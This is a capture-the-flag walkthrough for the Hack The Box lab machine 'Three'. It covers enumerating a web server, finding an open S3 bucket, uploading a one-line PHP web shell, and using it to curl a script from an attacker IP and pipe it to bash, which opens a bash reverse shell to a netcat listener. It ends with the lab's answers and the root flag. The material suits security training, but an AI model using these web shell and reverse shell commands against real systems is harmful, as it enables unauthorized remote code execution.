# Three - Very Easy

<details>
<summary>Nmap Scan</summary>

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Toppers
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

</details>
<br>

```shell
nmap -T4 -p- -A 10.129.100.92

gobuster dir -u http://10.129.100.92 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -z

gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

sudo apt install awscli
#setup awscli

aws --version

aws configure

aws s3 ls
#this gives an error

aws s3 ls --endpoint=http://s3.thetoppers.htb

aws s3 ls --endpoint=http://s3.thetoppers.htb s3://thetoppers.htb

echo '<?php system($_GET["1"]); ?>' > aws-shell.php

aws s3 cp aws-shell.php --endpoint=http://s3.thetoppers.htb s3://thetoppers.htb

aws s3 ls --endpoint=http://s3.thetoppers.htb s3://thetoppers.htb
#shows the uploaded shell

vim onelinershell.php

nc -nvlp 4445

python3 -m http.server 8080
```

```markdown
From the nmap scan, we find out that port 80 is open so we can check the website.

For enumeration, we can scan the website directories.

After getting the domain of the email address, we have to add it to our /etc/hosts file to help with further enumeration.

Using gobuster, we can scan for subdomains as well.

After getting the sub-domain, we need to add that to the /etc/hosts file as well, in the same way as we did for the TLD.

The sub-domain <http://s3.thetoppers.htb> just shows the status as running.

Checking the AWS documentation, we can get the required commands for setting up awscli.

While configuring awscli, we can give temporary values to the fields.

Later, while listing all S3 buckets, the command does not work without options, so we need to specify the domain.

Listing the buckets shows us the website's files.

We can attempt to upload a PHP shell to the S3 bucket directory.

We can use one-liner PHP shells and copy it to the S3 directory.

After uploading the file, we can visit <http://thetoppers.htb/aws-shell.php>.

Using the appropriate command parameter, <http://thetoppers.htb/aws-shell.php?1=id>, we can see our command is being run.

Now, we can try to get a reverse-shell, we need to setup a netcat listener as well.

Last step is to upload the shell file in the website, for which we can use curl.

We need to download the file as well as execute it, so we need to visit <http://thetoppers.htb/aws-shell.php?1=curl%20http://10.10.15.24:8080/onelinershell.php%20%7C%20bash>.

This gives us a shell on the listener, and flag can be found in /var/www.
```

```php
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.24/4445 0>&1
```

1. How many TCP ports are open? - 2

2. What is the domain of the email address provided in the "Contact" section of the website? - thetoppers.htb

3. In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames? - /etc/hosts

4. Which sub-domain is discovered during further enumeration? - s3.thetoppers.htb

5. Which service is running on the discovered sub-domain? - Amazon S3

6. Which command line utility can be used to interact with the service running on the discovered sub-domain? - awscli

7. Which command is used to set up the AWS CLI installation? - aws configure

8. What is the command used by the above utility to list all of the S3 buckets? - aws s3 ls

9. This server is configured to run files written in what web scripting language? - PHP

10. Submit root flag. - a980d99281a28d638ac68b9bf9453c2b
